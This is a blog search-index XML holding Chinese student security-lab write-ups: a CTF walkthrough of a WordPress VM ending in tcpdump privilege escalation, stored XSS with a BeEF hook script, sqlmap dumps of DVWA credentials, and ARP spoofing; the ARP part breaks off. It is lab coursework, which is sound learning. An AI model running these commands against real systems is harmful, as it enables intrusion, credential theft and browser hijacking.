<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Welcome</title>
      <link href="/2022/11/24/2018-07-01-welcome/"/>
      <url>/2022/11/24/2018-07-01-welcome/</url>
      
        <content type="html"><![CDATA[<p>If you see this page, that means you have setup your site. enjoy! :ghost: :ghost: :ghost:</p><p>You may want to <a href="https://tianqi.name/jekyll-TeXt-theme/docs/en/configuration">config the site</a> or <a href="https://tianqi.name/jekyll-TeXt-theme/docs/en/writing-posts">writing a post</a> next. Please feel free to <a href="https://github.com/kitian616/jekyll-TeXt-theme/issues">create an issue</a> or <a href="mailto:kitian616@outlook.com">send me email</a> if you have any questions.</p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Post with Header Image</title>
      <link href="/2022/11/24/2018-06-01-header-image/"/>
      <url>/2022/11/24/2018-06-01-header-image/</url>
      
        <content type="html"><![CDATA[<p>A Post with Header Image, See <a href="https://tianqi.name/jekyll-TeXt-theme/samples.html#page-layout">Page layout</a> for more examples.</p><span id="more"></span>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验四：CTF实践</title>
      <link href="/2022/11/24/2022-11-14-shi-yan-si/"/>
      <url>/2022/11/24/2022-11-14-shi-yan-si/</url>
      
        <content type="html"><![CDATA[<p>实验准备：</p><p>攻击机：kali：192.168.217.139</p><p>靶机WebDeveloper：192.168.217.148</p><h2 id="1、发现目标-netdiscover-，找到WebDeveloper的IP地址。截图。"><a href="#1、发现目标-netdiscover-，找到WebDeveloper的IP地址。截图。" class="headerlink" title="1、发现目标 (netdiscover)，找到WebDeveloper的IP地址。截图。"></a>1、发现目标 (netdiscover)，找到WebDeveloper的IP地址。截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114192133695.png" alt="image-20221114192133695"></p><h2 id="2、-利用NMAP扫描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）"><a href="#2、-利用NMAP扫描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）" class="headerlink" title="2、:利用NMAP扫描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）"></a>2、:利用NMAP扫描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114192305689.png" alt="image-20221114192305689"></p><p>开放22端口ssh服务，可以进行远程连接操作。开放80端口http服务，可以进行浏览器访问</p><h2 id="3、若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？"><a href="#3、若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？" class="headerlink" title="3、若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？"></a>3、若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114192807589.png" alt="image-20221114192807589"></p><p>浏览器访问之后，通过火狐插件wappalyzer可以知道该网站的指纹信息，可以看到该网站使用的是一个使用较多的cms：wordpress，同时在页面下面存在多个接口，其中login为网站后台登录页面，可能会被利用。</p><h2 id="4、利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？"><a href="#4、利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？" class="headerlink" title="4、利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？"></a>4、利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114193921477.png" alt="image-20221114193921477"></p><p>通过whatweb这个开源网站指纹识别工具也可以得知该网站cms是wordpress</p><h2 id="5、网络搜索wpscan，简要说明其功能。"><a href="#5、网络搜索wpscan，简要说明其功能。" class="headerlink" title="5、网络搜索wpscan，简要说明其功能。"></a>5、网络搜索wpscan，简要说明其功能。</h2><p>wpscan是一款针对于wordpress网站的漏洞扫描工具，除此之外，它还能够扫描类似robots.txt这样的敏感文件以及一些其他功能，例如：枚举网站用户，将用户名和密码进行爆破匹配等。</p><h2 id="6、使用-Dirb-爆破网站目录。（Dirb-是一个专门用于爆破目录的工具，在-Kali-中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster，-国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。"><a href="#6、使用-Dirb-爆破网站目录。（Dirb-是一个专门用于爆破目录的工具，在-Kali-中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster，-国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。" class="headerlink" title="6、使用 Dirb 爆破网站目录。（Dirb 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。"></a>6、使用 Dirb 爆破网站目录。（Dirb 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114200154496.png" alt="image-20221114200154496"></p><p>网络流量相关的有两个ipdata和network，经过实际访问，只有ipdata路径存在流量文件。</p><h2 id="5、浏览器访问该目录（路径），发现一个cap文件。截图。"><a href="#5、浏览器访问该目录（路径），发现一个cap文件。截图。" class="headerlink" title="5、浏览器访问该目录（路径），发现一个cap文件。截图。"></a>5、浏览器访问该目录（路径），发现一个cap文件。截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114204114838.png" alt="image-20221114204114838"></p><h2 id="6、利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。"><a href="#6、利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。" class="headerlink" title="6、利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。"></a>6、利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。</h2><p>wireshark打开数据包，追踪tcp流</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114211834865.png" alt="image-20221114211834865"></p><p>在流8的login.php页面的数据中发现了网站后台登录的账号密码，并将密码进行url解码得到：</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114211910354.png" alt="image-20221114211910354"></p><p>登录的账号密码为webdeveloper &#x2F; Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p><h2 id="7、利用上一步得到的信息进入网站后台。截图。"><a href="#7、利用上一步得到的信息进入网站后台。截图。" class="headerlink" title="7、利用上一步得到的信息进入网站后台。截图。"></a>7、利用上一步得到的信息进入网站后台。截图。</h2><p>（网站管理员账号与操作系统账号是不同概念）</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114212031606.png" alt="image-20221114212031606"></p><h2 id="8、利用该CMS存在的（插件Plugin）漏洞。"><a href="#8、利用该CMS存在的（插件Plugin）漏洞。" class="headerlink" title="8、利用该CMS存在的（插件Plugin）漏洞。"></a>8、利用该CMS存在的（插件Plugin）漏洞。</h2><h2 id="9、利用该插件漏洞提权。"><a href="#9、利用该插件漏洞提权。" class="headerlink" title="9、利用该插件漏洞提权。"></a>9、利用该插件漏洞提权。</h2><p>要求我们使用插件漏洞功能点进行反弹shell，网上查找该cms存在漏洞的插件为reflex gallery，file manager。先试试第一个插件：在后台的plugins-&gt;add new 中搜索该插件，并下载安装<img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114213748671.png" alt="image-20221114213748671"></p><p>安装完成之后点击activate启动它</p><p>开启msf进行反弹shell操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search reflex gallery   //查找漏洞利用模块</span><br><span class="line">use 0                   //使用该模块</span><br><span class="line">options//查看利用还需要进行设置的部分</span><br><span class="line">set rhosts 192.168.217.148  //设置攻击目标，即靶机ip</span><br><span class="line">run//启动</span><br></pre></td></tr></table></figure><p>options查看后，发现只需要设置一个rhosts（攻击目标）即可。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114214442166.png" alt="image-20221114214442166"></p><p>建立会话失败了。。。。</p><p>那就改用file manager 插件，同样的操作安装插件，装好之后直接查找wp-config.php文件，下载并查看</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114222502675.png" alt="image-20221114222502675"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114222553116.png" alt="image-20221114222553116"></p><h2 id="10、SSH登录服务器"><a href="#10、SSH登录服务器" class="headerlink" title="10、SSH登录服务器"></a>10、SSH登录服务器</h2><p>尝试利用上一步获得的访问数据库的用户名和密码连接远程服务器。截图。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114222856989.png" alt="image-20221114222856989"></p><h3 id="1、尝试查看-x2F-root-x2F-flag-tx"><a href="#1、尝试查看-x2F-root-x2F-flag-tx" class="headerlink" title="1、尝试查看&#x2F;root&#x2F;flag.tx"></a>1、尝试查看&#x2F;root&#x2F;flag.tx</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114222922266.png" alt="image-20221114222922266"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114223447002.png" alt="image-20221114223447002"></p><p>提示权限不够，那就需要进行提权了。</p><p>sudo -l 查看可以执行root权限的命令</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114223225042.png" alt="image-20221114223225042"></p><p>发现可以root命令执行tcpdump命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/shell     //创建一个文件</span><br><span class="line"></span><br><span class="line">echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/shell  //写入要执行的命令</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/shell//为该文件添加可执行权限</span><br><span class="line"></span><br><span class="line">sudo tcpdump -i eth0 -w /dev/null -w 1 -G 1 -z /tmp/shell -Z root  //利用tcpdump执行命令</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221114224058468.png" alt="image-20221114224058468"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcpdump命令详解：</span><br><span class="line"></span><br><span class="line">-i eth0 从指定网卡捕获数据包</span><br><span class="line"></span><br><span class="line">-w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果）</span><br><span class="line"></span><br><span class="line">-z [command] 运行指定的命令</span><br><span class="line"></span><br><span class="line">-Z [user] 指定用户执行命令</span><br><span class="line"></span><br><span class="line">-G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储</span><br><span class="line"></span><br><span class="line">-W [num] 指定抓包数量</span><br></pre></td></tr></table></figure><h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>本次实验通过渗透webdeveloper靶机并提权获取flag。</p><p>思路：</p><p>首先必须得知道靶机的ip地址，通过nmap或者arp-scan都可以获取到，得到ip之后扫描该主机开放的端口，只有知道开放了什么端口，得知运行了什么服务之后，才有思路做下去。通过扫描得知开放了80端口-http服务和22端口-ssh服务。既然开启了80端口那么肯定就是通过访问网站，查找有没有可以利用的功能点。同时看到开放22端口，猜测应该是通过访问网站拿到ssh远程登录的账号密码。访问浏览器后，得知网站cms为wordpress，大多数都存在漏洞，但是不同版本的wordpress存在漏洞不一样。网页中发现存在网站后台登录页面，那么我们现在首要目标就是获取到网站后台登录的账号密码，wordpress应该不存在弱口令（目前没遇到过）。可以通过wordpress专用的漏洞扫描器wpscan进行扫描枚举网站的用户名（能不用就不用，wpscan初次使用过于复杂），先使用目录扫描工具进行扫描网站存在的目录，扫描后看到有个和网络流量相关的目录。顺利拿到网站登录的流量包，wireshark打开发现网站后台登录密码。登入后台之后寻找利用功能点，多个地方存在利用点。使用最简单的方法：通过该版本存在的file manager插件漏洞，安装后可直接浏览主机的低权限文件。查看配置文件（类似config.php字样），拿到数据库登录的账号密码，即ssh远程登录的账号密码。ssh远程登录之后发现需要提权，那么首先先查看能执行root权限的命令，找到之后再使用对应的方法进行提权拿到flag。</p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验三：XSS和SQL注入</title>
      <link href="/2022/11/24/2022-11-7-shi-yan-san/"/>
      <url>/2022/11/24/2022-11-7-shi-yan-san/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS部分：利用Beef劫持被攻击者客户端浏览器"><a href="#XSS部分：利用Beef劫持被攻击者客户端浏览器" class="headerlink" title="XSS部分：利用Beef劫持被攻击者客户端浏览器"></a>XSS部分：利用Beef劫持被攻击者客户端浏览器</h2><h3 id="搭建GuestBook网站"><a href="#搭建GuestBook网站" class="headerlink" title="搭建GuestBook网站"></a>搭建GuestBook网站</h3><p>把网站文件夹（GuestBook）复制到windows server中，通过windows server的IIS配置该网站。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153837190.png" alt="image-20221107153837190"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153940174.png" alt="image-20221107153940174"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153954937.png" alt="image-20221107153954937"></p><h2 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170236994.png" alt="image-20221107170236994"></p><h2 id="2、-Kali使用beef生成恶意代码，截图。"><a href="#2、-Kali使用beef生成恶意代码，截图。" class="headerlink" title="2、 Kali使用beef生成恶意代码，截图。"></a>2、 Kali使用beef生成恶意代码，截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170410716.png" alt="image-20221107170410716"></p><h2 id="3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，"><a href="#3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，" class="headerlink" title="3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，"></a>3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，</h2><script src="http://Kali的IP地址:3000/hook.js"></script>，截图。<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170940533.png" alt="image-20221107170940533"></p><p>之后，客户端访问这个页面，kali的beef中都会劫持到。</p><h2 id="4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"><a href="#4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。" class="headerlink" title="4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"></a>4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</h2><p>通过beef的控制台，让被劫持的主机访问桂电官网。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107174428936.png" alt="image-20221107174428936"></p><p>再到靶机看看效果</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107174504720.png" alt="image-20221107174504720"></p><h2 id="5、回答问题：实验中XSS攻击属于哪种类型？"><a href="#5、回答问题：实验中XSS攻击属于哪种类型？" class="headerlink" title="5、回答问题：实验中XSS攻击属于哪种类型？"></a>5、回答问题：实验中XSS攻击属于哪种类型？</h2><p>存储型xss</p><h1 id="SQL注入部分：DVWA-SQLmap-Mysql注入实战"><a href="#SQL注入部分：DVWA-SQLmap-Mysql注入实战" class="headerlink" title="SQL注入部分：DVWA+SQLmap+Mysql注入实战"></a>SQL注入部分：DVWA+SQLmap+Mysql注入实战</h1><h2 id="1、注入点发现。首先肯定是要判断是否有注入漏洞。"><a href="#1、注入点发现。首先肯定是要判断是否有注入漏洞。" class="headerlink" title="1、注入点发现。首先肯定是要判断是否有注入漏洞。"></a>1、注入点发现。首先肯定是要判断是否有注入漏洞。</h2><p>输入框输入1，能够正常回显。输入1’，报错。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images//image-20221107183705270.png" alt="image-20221107183705270"></p><p><img src="C:\Users\ztf\OneDrive\文档\7562ajj.github.io\assets\images\image-20221107183739426.png" alt="image-20221107183739426"></p><p>此时说明参数id处存在sql注入。</p><h2 id="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"><a href="#下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；" class="headerlink" title="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"></a>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</h2><h3 id="1、枚举当前使用的数据库名称和用户名。"><a href="#1、枚举当前使用的数据库名称和用户名。" class="headerlink" title="1、枚举当前使用的数据库名称和用户名。"></a>1、枚举当前使用的数据库名称和用户名。</h3><p>先通过抓包获取当前的cookie值</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107185317120.png" alt="image-20221107185317120"></p><p>丢到sqlmap里跑数据库名和用户名</p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -b --current-db --current-user</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107193814083.png" alt="image-20221107193814083"></p><h3 id="3、枚举数据库用户名和密码"><a href="#3、枚举数据库用户名和密码" class="headerlink" title="3、枚举数据库用户名和密码"></a>3、枚举数据库用户名和密码</h3><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --users --password</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107194936019.png" alt="image-20221107194936019"></p><h3 id="4、枚举数据库"><a href="#4、枚举数据库" class="headerlink" title="4、枚举数据库"></a>4、枚举数据库</h3><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195200088.png" alt="image-20221107195200088"></p><h3 id="5、枚举数据库和指定数据库的数据表"><a href="#5、枚举数据库和指定数据库的数据表" class="headerlink" title="5、枚举数据库和指定数据库的数据表"></a>5、枚举数据库和指定数据库的数据表</h3><p>-D：指定的数据库</p><p>-T：指定数据库中的数据表</p><p>爆破dvwa数据库下的所有表：</p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; --tables  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195543633.png" alt="image-20221107195543633"></p><h3 id="6、获取指定数据库和表中所有列的信息"><a href="#6、获取指定数据库和表中所有列的信息" class="headerlink" title="6、获取指定数据库和表中所有列的信息"></a>6、获取指定数据库和表中所有列的信息</h3><p>–columns：获取列的信息</p><p>爆破dvwa库的users表下的所有列：</p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195735974.png" alt="image-20221107195735974"></p><h3 id="7、枚举指定数据表中的所有用户名与密码-并down到本地。"><a href="#7、枚举指定数据表中的所有用户名与密码-并down到本地。" class="headerlink" title="7、枚举指定数据表中的所有用户名与密码,并down到本地。"></a>7、枚举指定数据表中的所有用户名与密码,并down到本地。</h3><p>-C：枚举数据表中的列</p><p>–dump：存储数据表项</p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; -C &#x27;password&#x27; --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107200225974.png" alt="image-20221107200225974"></p><p>结果也已经自动保存到本地</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107200333619.png" alt="image-20221107200333619"></p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验二：网络嗅探与身份认证</title>
      <link href="/2022/11/24/2022-11-7-shi-yan-er/"/>
      <url>/2022/11/24/2022-11-7-shi-yan-er/</url>
      
        <content type="html"><![CDATA[<h1 id="网络嗅探与身份认证"><a href="#网络嗅探与身份认证" class="headerlink" title="网络嗅探与身份认证"></a>网络嗅探与身份认证</h1><h2 id="1-A主机上外网，B运行sinffer-Wireshark-选定只抓源为A的数据"><a href="#1-A主机上外网，B运行sinffer-Wireshark-选定只抓源为A的数据" class="headerlink" title="1.A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)"></a>1.A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)</h2><h3 id="1-1-写出以上过滤语句"><a href="#1-1-写出以上过滤语句" class="headerlink" title="1.1 写出以上过滤语句"></a>1.1 写出以上过滤语句</h3><p>ip.src&#x3D;&#x3D;A的ip</p><h3 id="1-2-在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？"><a href="#1-2-在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？" class="headerlink" title="1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？"></a>1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？</h3><p>本题用了两个linux虚拟机做实验，两者处于同一网段下，用A访问桂林生活网并输入账号密码进行登录</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102110106546.png" alt="image-20221102110106546"></p><p>B打开wireshark选定只抓取源A的数据</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221104194324037.png" alt="image-20221104194324037"></p><p>B是看不到A与外网的通信的，因为A访问外网的数据流量直接通过网关发送，A与外网的通信数据不会经过B。</p><h2 id="2-ARP欺骗"><a href="#2-ARP欺骗" class="headerlink" title="2.ARP欺骗"></a>2.ARP欺骗</h2><p>攻击机：kali</p><p>靶机：Windows xp</p><h3 id="2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"><a href="#2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？" class="headerlink" title="2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"></a>2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？</h3><p>B冒充的是子网中的网关</p><h3 id="2-2-写出arpspoof命令格式。"><a href="#2-2-写出arpspoof命令格式。" class="headerlink" title="2.2 写出arpspoof命令格式。"></a>2.2 写出arpspoof命令格式。</h3><p>arpspoof -i 网卡 -t 目标ip 网关ip</p><h3 id="2-3-B是否能看到A和外网的通信（A输入的帐户和口令）？"><a href="#2-3-B是否能看到A和外网的通信（A输入的帐户和口令）？" class="headerlink" title="2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？"></a>2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？</h3><p>要实现欺骗，先使用arpspoof工具使目标处于断网状态。</p><p>先查看网关p：route -n（192.168.217.2）</p><p>查自己局域网ip：ifconfig（192.168.217.139）</p><p>扫描同网段下存活的主机（确定目标主机）：nmap -sP 192.168.217.2&#x2F;24，得到目标ip为192.168.217.145</p><p>使用命令arpspoof -i eth0 -t 192.168.217.145 192.168.217.2 断开目标主机的通信</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101200316486.png" alt="image-20221101200316486"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101200446641.png" alt="image-20221101200446641"></p><p>此时发现靶机已无法上网。靶机的网关地址也变成了攻击机的mac</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101212759143.png" alt="image-20221101212759143"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101212821243.png" alt="image-20221101212821243"></p><p>接着尝试获取目标主机上网时的登录账号密码。这样那我们就必须得让目标主机能够上网。</p><p>开启流量转发，使得被欺骗后的目标仍然可以上网。命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>再输入命令cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward检查ip是否转发成功，值为1即成功，0则失败。</p><p>接着编辑&#x2F;etc&#x2F;ettercap&#x2F;etter.conf 